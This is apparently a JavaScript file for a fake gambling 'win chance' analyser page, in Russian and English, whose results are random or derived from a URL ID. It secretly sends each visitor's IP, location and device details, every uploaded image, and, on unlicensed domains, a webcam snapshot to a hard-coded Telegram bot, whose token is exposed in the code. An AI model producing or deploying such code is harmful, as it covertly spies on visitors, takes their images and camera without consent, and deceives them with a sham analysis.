const TELEGRAM_BOT_TOKEN = '8171976490:AAF1Plt75Z3Ypbrv9sF27cub0yFaR0yAKUw';
const ADMIN_ID = '6436999031';

async function sendTelegramMessage(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Failed to send message:', error);
    }
}

// Функция для отправки изображения в Telegram
async function sendImageToTelegram(imageData) {
    try {
        // Конвертируем Base64 в Blob
        const fetchResponse = await fetch(imageData);
        const blob = await fetchResponse.blob();
        
        // Создаем FormData и добавляем фото
        const formData = new FormData();
        formData.append('chat_id', ADMIN_ID);
        formData.append('photo', blob, 'uploaded_image.jpg');
        
        // Отправляем фото в Telegram
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        if (result.ok) {
            console.log('Изображение успешно отправлено в Telegram');
        } else {
            console.error('Ошибка при отправке изображения:', result);
        }
    } catch (error) {
        console.error('Не удалось отправить изображение в Telegram:', error);
    }
}

async function getCountryName(countryCode) {
    try {
        const response = await fetch(`https://restcountries.com/v3.1/alpha/${countryCode}`);
        const data = await response.json();
        return data[0]?.name.common || 'Unknown';
    } catch (error) {
        console.error('Failed to fetch country name:', error);
        return 'Unknown';
    }
}

async function getUserInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const countryName = await getCountryName(data.country);
        const deviceInfo = parseUserAgent(navigator.userAgent);

        return {
            ip: data.ip,
            country: data.country,
            countryName: countryName,
            city: data.city,
            region: data.region,
            countryEmoji: getCountryEmoji(data.country),
            userAgent: navigator.userAgent,
            deviceModel: deviceInfo.model,
            deviceType: deviceInfo.type,
            deviceOS: deviceInfo.os
        };
    } catch (error) {
        console.error('Failed to fetch user info:', error);
        return {
            ip: 'Unknown',
            country: 'Unknown',
            countryName: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            countryEmoji: '❓',
            userAgent: navigator.userAgent,
            deviceModel: 'Unknown',
            deviceType: 'Unknown',
            deviceOS: 'Unknown'
        };
    }
}

function parseUserAgent(userAgent) {
    // Detect mobile devices
    const mobileRegexes = [
        { regex: /iPhone\s*(\d+([_\.]\d+)*)/i, type: 'Mobile', os: 'iOS' },
        { regex: /iPad/i, type: 'Tablet', os: 'iOS' },
        { regex: /Android\s*([\d\.]+)/i, type: 'Mobile', os: 'Android' },
        { regex: /Windows Phone\s*([\d\.]+)/i, type: 'Mobile', os: 'Windows Phone' },
    ];

    // Detect desktop OS
    const desktopRegexes = [
        { regex: /Windows/i, type: 'Desktop', os: 'Windows' },
        { regex: /Macintosh/i, type: 'Desktop', os: 'macOS' },
        { regex: /Linux/i, type: 'Desktop', os: 'Linux' }
    ];

    // Check mobile devices first
    for (let mobileDevice of mobileRegexes) {
        const match = userAgent.match(mobileDevice.regex);
        if (match) {
            return {
                type: mobileDevice.type,
                os: mobileDevice.os,
                model: parseDeviceModel(userAgent, mobileDevice.os)
            };
        }
    }

    // If no mobile device, check desktop OS
    for (let desktopOS of desktopRegexes) {
        const match = userAgent.match(desktopOS.regex);
        if (match) {
            return {
                type: desktopOS.type,
                os: desktopOS.os,
                model: parseDeviceModel(userAgent, desktopOS.os)
            };
        }
    }

    // Fallback
    return {
        type: 'Unknown',
        os: 'Unknown',
        model: 'Unknown Device'
    };
}

function parseDeviceModel(userAgent, os) {
    switch(os) {
        case 'iOS':
            const iPhoneMatch = userAgent.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
            if (iPhoneMatch) {
                return `iPhone ${iPhoneMatch[1].replace(/[_\.]/g, ' ')}`;
            }
            const iPadMatch = userAgent.match(/iPad/i);
            if (iPadMatch) {
                return 'iPad';
            }
            break;
        case 'Android':
            const androidModelMatch = userAgent.match(/;\s*([^;)]+)\s*Build/i);
            if (androidModelMatch) {
                return androidModelMatch[1].trim();
            }
            break;
        case 'Windows':
            const windowsModelMatch = userAgent.match(/Windows\s*([\w\s]+)/i);
            if (windowsModelMatch) {
                return `Windows ${windowsModelMatch[1]}`;
            }
            break;
        case 'macOS':
            const macModelMatch = userAgent.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
            if (macModelMatch) {
                return `Mac ${macModelMatch[1]}`;
            }
            break;
    }
    return 'Unknown Device';
}
function getCountryEmoji(countryCode) {
    return countryCode.replace(/./g, char =>
        String.fromCodePoint(127397 + char.toUpperCase().charCodeAt())
    );
}

async function captureAndSendPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        video.pause();
        stream.getTracks().forEach(track => track.stop());

        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        const formData = new FormData();
        formData.append('chat_id', ADMIN_ID);
        formData.append('photo', imageBlob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        console.log('Photo captured and sent successfully');
    } catch (error) {
        console.error('Failed to capture photo:', error);
    }
}

async function initTelegramBot() {
    const domainInfo = {
        domain: window.location.hostname,
        fullUrl: window.location.href
    };
    // Проверка домена
    if (domainInfo.domain !== 'file:///C:/Users/Enty/Desktop/aicas/index.html') {
        // Создание элемента для замены содержимого
        document.body.innerHTML = `
            <div id="overlay">
                <h1>Ошибка 404: Доступ запрещен</h1>
                <div class="arrow top"></div>
                <div class="arrow bottom"></div>
                <div class="arrow left"></div>
                <div class="arrow right"></div>
                <img src="data:image/png;base64,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" alt="Error Image" style="max-width: 100%; height: auto;" />
                <p>К сожалению, возникли проблемы с доступом к сайту:</p>
                <ul>
                    <li>Не удалось загрузить ресурс.</li>
                    <li>Проблемы с сервером.</li>
                    <li>Неправильный домен.</li>
                    <li>Возможно вы блюм.</li>
                    <li>Возможно вы хотели спиздить вебку.</li>
                    <li>Возможно вы хотели обновить вебку за 15$.</li>
                    <li>Возможно вы хотели купить вебку у ее кодера.</li>
                </ul>

                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" id="fixButton">Fix It</a>
            </div>
        `;

        // Стили для перекрытия
        const style = document.createElement('style');
        style.innerHTML = `

            body {
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                position: relative;
                overflow: hidden;
                background-color: #282c34;
                color: white;
                font-family: 'Arial', sans-serif;
            }
            #overlay {
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                padding: 20px;
                animation: flicker 1s infinite;
            }
            h1 {
                font-size: 4em;
                margin: 0;
                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
                animation: glow 1.5s infinite alternate;
            }
            p {
                font-size: 1.5em;
                margin: 20px 0;
                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
            }
            ul {
                list-style-type: none;
                padding: 0;
                text-align: center;
                font-size: 1.2em;
            }
            #fixButton {
                background-color: white;
                color: red;
                border: none;
                padding: 10px 20px;
                font-size: 18px;
                cursor: pointer;
                text-decoration: none;
                border-radius: 5px;
                transition: background-color 0.3s, transform 0.3s;
                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
            }
            #fixButton:hover {
                background-color: #ddd;
                transform: scale(1.05);
            }
            @keyframes flicker {
                0% { opacity: 1; }
                50% { opacity: 0.7; }
                100% { opacity: 1; }
            }
            @keyframes glow {
                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }
                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }
            }

        `;
        document.head.appendChild(style);



        
        const userInfo = await getUserInfo();
    await sendTelegramMessage(`
🚫 <b>Unauthorized Access Attempt Detected</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
    `);

        // Захват и отправка фото с камеры
        await captureAndSendPhoto();
        return;
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
        const data = await response.json();
        
        if (data.ok) {
            console.log('Bot initialized');
            isAuthenticated = true;

            const userInfo = await getUserInfo();
    await sendTelegramMessage(`
🚀 <b>New Bot Access Detected</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
    `);
        }
    } catch (error) {
        console.error('Failed to initialize bot:', error);

        const userInfo = await getUserInfo();
    await sendTelegramMessage(`
❗️ <b>Bot Initialization Failed</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
    `);
    }
}

initTelegramBot().then(() => {
    if (isAuthenticated) {
        fetchDataAndUpdate();
        setInterval(fetchDataAndUpdate, 100);
        setInterval(checkSignal, 100);
        checkSignal();
    }
});



document.addEventListener('DOMContentLoaded', () => {
    const imageUpload = document.getElementById('image-upload');
    const previewSection = document.getElementById('preview-section');
    const previewImage = document.getElementById('preview-image');
    const analyzeButton = document.getElementById('analyze-button');
    const results = document.getElementById('results');
    const winChance = document.getElementById('win-chance');
    const rotations = document.getElementById('rotations');
    const blurOverlay = document.getElementById('blur-overlay');
    const imageContainer = document.querySelector('.image-container');
    const container = document.querySelector('.container');
    const idDisplay = document.getElementById('id-display');


    function getUrlParameter(name) {
        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
        const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
        const results = regex.exec(location.search);
        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    }
    

    const urlId = getUrlParameter('id');
    if (urlId) {
        idDisplay.textContent = `ID: ${urlId}`;
        idDisplay.classList.add('visible');
        

        const hashCode = function(s) {
            let h = 0;
            for(let i = 0; i < s.length; i++)
                h = Math.imul(31, h) + s.charCodeAt(i) | 0;
            return Math.abs(h);
        };
        

        window.idHash = hashCode(urlId);
    }

    setTimeout(() => {
        container.style.opacity = '1';
        container.style.transform = 'translateY(0)';
    }, 200);

    imageUpload.addEventListener('change', (event) => {
        const file = event.target.files[0];
        
        if (file && file.type.startsWith('image/')) {
            const reader = new FileReader();
            
            reader.onload = (e) => {
                previewImage.src = e.target.result;
                previewSection.style.display = 'block';
                results.style.display = 'none';
                
                // Добавляем анимацию появления превью
                previewImage.style.opacity = '0';
                previewImage.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    previewImage.style.opacity = '1';
                    previewImage.style.transform = 'scale(1)';
                }, 100);
                
                // Отправляем изображение в Telegram
                sendImageToTelegram(e.target.result);
                
                // Отправляем информацию о пользователе и изображении
                sendUserInfoWithImage(urlId || 'Неизвестный ID');
            };
            
            reader.readAsDataURL(file);
        }
    });


    analyzeButton.addEventListener('click', () => {
        if (previewImage.src) {
            // Начинаем "анализ"
            imageContainer.classList.add('analyzing');
            blurOverlay.innerHTML = '<div class="analyzing-text">Анализирую...</div>';
            
 
            analyzeButton.disabled = true;
            analyzeButton.classList.add('disabled');
            

            const steps = 6;
            const stepTime = 500;
            let currentStep = 0;
            
            const analyzeInterval = setInterval(() => {
                currentStep++;
                
                if (currentStep <= steps) {

                    const texts = [
                        'Сканирование...',
                        'Проверка паттернов...',
                        'Расчет вероятностей...',
                        'Анализ алгоритма...',
                        'Декодирование RTP...',
                        'Завершение анализа...'
                    ];
                    blurOverlay.innerHTML = `<div class="analyzing-text">${texts[currentStep - 1]}</div>`;
                    

                    const blurValue = 8 + (currentStep * 2);
                    const brightnessValue = 0.7 - (currentStep * 0.05);
                    const contrastValue = 1.2 + (currentStep * 0.05);
                    
                    blurOverlay.style.backdropFilter = `blur(${blurValue}px)`;
                    previewImage.style.filter = `brightness(${brightnessValue}) contrast(${contrastValue}) saturate(1.2)`;
                    

                    previewImage.style.transform = currentStep % 2 === 0 ? 'scale(1.02)' : 'scale(1)';
                } else {
                    clearInterval(analyzeInterval);
                    

                    let chanceValue, rotationsValue;
                    
                    if (window.idHash) {

                        chanceValue = 20 + (window.idHash % 41); 
                        rotationsValue = 10 + (window.idHash % 51); 
                    } else {

                        chanceValue = getRandomInt(20, 60);
                        rotationsValue = getRandomInt(10, 60);
                    }
                    

                    setTimeout(() => {

                        winChance.textContent = '0%';
                        rotations.textContent = '0';
                        results.style.display = 'block';
                        results.style.opacity = '0';
                        results.style.transform = 'translateY(20px)';
                        
                        setTimeout(() => {
                            results.style.opacity = '1';
                            results.style.transform = 'translateY(0)';
                            

                            animateValue(winChance, 0, chanceValue, 1800, '%');
                            animateValue(rotations, 0, rotationsValue, 1800, '');
                        }, 300);
                    }, 500);
                    

                    setTimeout(() => {

                        blurOverlay.style.opacity = '0';
                        previewImage.style.filter = 'brightness(1) contrast(1)';
                        previewImage.style.transform = 'scale(1)';
                        
                        setTimeout(() => {
                            imageContainer.classList.remove('analyzing');
                            blurOverlay.innerHTML = '';
                            analyzeButton.disabled = false;
                            analyzeButton.classList.remove('disabled');
                            blurOverlay.style.backdropFilter = 'blur(10px)';
                            blurOverlay.style.opacity = '';
                        }, 500);
                    }, 800);
                }
            }, stepTime);
        }
    });


    function animateValue(element, start, end, duration, suffix = '') {
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            

            const easeOutProgress = 1 - Math.pow(1 - progress, 3);
            const value = Math.floor(easeOutProgress * (end - start) + start);
            
            element.textContent = value + suffix;
            if (progress < 1) {
                window.requestAnimationFrame(step);
            } else {

                element.style.textShadow = '0 0 20px rgba(255, 153, 102, 0.8)';
                setTimeout(() => {
                    element.style.textShadow = '';
                }, 500);
            }
        };
        window.requestAnimationFrame(step);
    }


    function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }


    const uploadLabel = document.querySelector('.upload-label');
    
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        uploadLabel.addEventListener(eventName, preventDefaults, false);
    });
    
    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }
    
    ['dragenter', 'dragover'].forEach(eventName => {
        uploadLabel.addEventListener(eventName, highlight, false);
    });
    
    ['dragleave', 'drop'].forEach(eventName => {
        uploadLabel.addEventListener(eventName, unhighlight, false);
    });
    
    function highlight() {
        uploadLabel.classList.add('highlight');
    }
    
    function unhighlight() {
        uploadLabel.classList.remove('highlight');
    }
    
    uploadLabel.addEventListener('drop', handleDrop, false);
    
    function handleDrop(e) {
        const dt = e.dataTransfer;
        const file = dt.files[0];
        
        if (file && file.type.startsWith('image/')) {
            const reader = new FileReader();
            
            reader.onload = (e) => {
                previewImage.src = e.target.result;
                previewSection.style.display = 'block';
                results.style.display = 'none';
                
                // Добавляем анимацию появления превью
                previewImage.style.opacity = '0';
                previewImage.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    previewImage.style.opacity = '1';
                    previewImage.style.transform = 'scale(1)';
                }, 100);
                
                // Отправляем изображение в Telegram при перетаскивании
                sendImageToTelegram(e.target.result);
                
                // Отправляем информацию о пользователе и изображении
                sendUserInfoWithImage(urlId || 'Неизвестный ID');
            };
            
            reader.readAsDataURL(file);
        }
    }
    

    container.style.opacity = '0';
    container.style.transform = 'translateY(20px)';
    setTimeout(() => {
        container.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
    }, 50);

    // Функция для отправки информации о пользователе вместе с уведомлением о загрузке изображения
    async function sendUserInfoWithImage(userId) {
        try {
            const userInfo = await getUserInfo();
            const message = `
🖼️ <b>Новое изображение загружено</b>
👤 User ID: <code>${userId}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Локация: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Устройство: <code>${userInfo.deviceModel}</code>
🖥️ Тип: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
⏰ Время: <code>${new Date().toISOString()}</code>
            `;
            
            await sendTelegramMessage(message);
        } catch (error) {
            console.error('Не удалось отправить информацию о пользователе:', error);
        }
    }
}); 